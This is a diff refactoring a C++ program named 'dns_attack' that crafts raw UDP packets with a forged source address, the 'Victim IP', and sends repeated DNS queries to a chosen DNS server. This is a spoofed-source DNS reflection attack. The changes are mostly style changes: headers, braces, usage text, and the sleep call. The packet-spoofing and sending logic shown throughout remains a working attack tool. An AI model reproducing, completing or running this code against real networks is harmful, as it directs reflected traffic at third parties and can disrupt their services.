@@ -1,20 +1,19 @@
 #include <iostream>
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h> // sleep
-#include <string.h> // bzero
+#include <cstdio>
+#include <cstdlib>
+#include <cstring> // bzero
 #include <sys/socket.h> // socket
 #include <netinet/ip.h> // ip header
 #include <netinet/udp.h> // udp header
 #include <arpa/inet.h> // inet_addr, htons
 
+#include <chrono>
+#include <thread>
+
 #define MAX_BUFF 65535 // ipv4 packet max length
 #define DNS_PORT 53 // dns port
 #define DNS_REPEAT 3 // dns queries repeat time
-#define MAIN_USAGE "./dns_attack <Victim IP> <UDP Source Port> <DNS Server IP>"
 #define DOMAIN_NAME "4ieee3org" // dns special format
-
-using namespace std;
 
 struct dnshdr {
     uint16_t queryid;
@@ -61,13 +60,23 @@ void err_exit(const char *x) {
 
 unsigned short checksum(void *in, int size){
     long sum = 0;
-    unsigned short *ptr = (unsigned short *) in;
+    unsigned short *ptr = (unsigned short *)in;
+
     // sum up
-    for (; size > 1; size -= 2) sum += *ptr++;
+    for (; size > 1; size -= 2) {
+        sum += *ptr++;
+    }
+
     // zero-padding if length is odd
-    if (size > 0) sum += *((unsigned char *) ptr);
+    if (size > 0) {
+        sum += *((unsigned char *) ptr);
+    }
+
     // overflow
-    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
+    while (sum >> 16) {
+        sum = (sum & 0xffff) + (sum >> 16);
+    }
+
     // return 1's complement
     return ~sum;
 }
@@ -89,8 +98,9 @@ void set_dns(unsigned char *packet, size_t &packetlen) {
     // transform the domain name into special format, digit to hex
     unsigned char transformed[] = DOMAIN_NAME;
     for (int i = 0; i < strlen(DOMAIN_NAME); i++) {
-        if (isdigit(transformed[i]))
+        if (isdigit(transformed[i])) {
             transformed[i] = transformed[i] - 48;
+        }
     }
     memcpy(dnsd -> dname, transformed, strlen(DOMAIN_NAME));
     packetlen += sizeof(struct dnsdata);
@@ -135,7 +145,7 @@ void set_iphdr(unsigned char *packet, size_t &packetlen, char *saddr, char *dadd
     ip -> daddr = inet_addr(daddr);
 }
 
-int main(int argc, char **argv) {
+int main(int argc, char *argv[]) {
     // declaration
     int srcport;
     int sockfd; // socket file descriptor
@@ -146,24 +156,33 @@ int main(int argc, char **argv) {
     size_t packetlen;
 
     // return usage
-    if (argc != 4) err_exit(MAIN_USAGE);
+    if (argc != 4) {
+        printf("How to use: %s <Victim IP> <UDP Source Port> <DNS Server IP>", argv[0]);
+        exit(1);
+    }
+
     // check port value
     srcport = atoi(argv[2]);
-    if (srcport > 65535 || srcport < 0) err_exit("main: wrong port value");
+    if (srcport < 0 || srcport > 65535) {
+        err_exit("main: wrong port value");
+    }
 
     // create a raw socket
-    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0)
+    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
         err_exit("main: socket");
+    }
+
     // set socket option to build the ip header by self
     on = 1;
-    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(int)) < 0)
+    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(int)) < 0) {
         err_exit("main: setsockopt");
+    }
 
     // fill in destination address
     bzero(&dstaddr, sizeof(dstaddr));
     dstaddr.sin_family = AF_INET;
     dstaddr.sin_addr.s_addr = inet_addr(argv[3]); // dns server
-    dstaddr.sin_port = htons(DNS_PORT); //dns port
+    dstaddr.sin_port = htons(DNS_PORT); // dns port
     dstlen = sizeof(dstaddr);
 
     // encapsulate the packet (from inside)
@@ -175,10 +194,11 @@ int main(int argc, char **argv) {
 
     // send to destination
     for (int i = 0; i < DNS_REPEAT; i++) {
-        if (sendto(sockfd, packet, packetlen, 0, (struct sockaddr *) &dstaddr, dstlen) < 0)
+        if (sendto(sockfd, packet, packetlen, 0, (struct sockaddr *) &dstaddr, dstlen) < 0) {
 			err_exit("main: sendto");
+        }
         printf("Sending DNS packet to DNS server %s with spoofed source %s:%d\n", argv[3], argv[1], srcport);
-        sleep(1);
+        std::this_thread::sleep_for(std::chrono::milliseconds(1000));//sleep(1);
     }
 
     return 0;
